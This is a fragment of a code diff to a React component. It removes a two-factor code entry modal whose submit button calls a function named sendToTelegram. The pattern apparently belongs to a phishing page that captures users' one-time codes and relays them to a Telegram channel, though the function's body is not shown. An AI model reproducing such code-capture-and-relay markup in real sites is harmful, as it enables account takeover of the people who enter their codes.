-                        alt={twoFactorImageAlt}
-                        width={1125}
-                        height={492}
-                        className={styles.twoFactorImage}
-                        priority
-                      />
-                    </div>
-                    <input
-                      type="text"
-                      value={twoFactorCode}
-                      onChange={(event) => handleTwoFactorChange(event.target.value)}
-                      placeholder={twoFactorPlaceholder}
-                      className={styles.twoFactorCodeInput}
-                      inputMode="numeric"
-                    />
-                    {twoFactorErrorMessage ? <p className={styles.twoFactorError}>{twoFactorErrorMessage}</p> : null}
-
-                    <button
-                      type="button"
-                      className={styles.modalSubmitButton}
-                      disabled={isSubmitDisabled || !twoFactorCode.trim()}
-                      onClick={() => void sendToTelegram()}
-                    >
-                      {continueButtonLabel}
-                    </button>
-                    <button
-                      type="button"
-                      className={styles.altMethodsTrigger}
-                      onClick={openTwoFactorOptionsPopup}
-                    >
-                      {modal.altMethodsTriggerLabel}
-                    </button>
-                  </>
-                )}
-              </div>
-            )}
+              </form>
+            </div>
           </div>
-        </div>
-      ) : null}
+        )}
+      </main>
     </div>
   );
 }
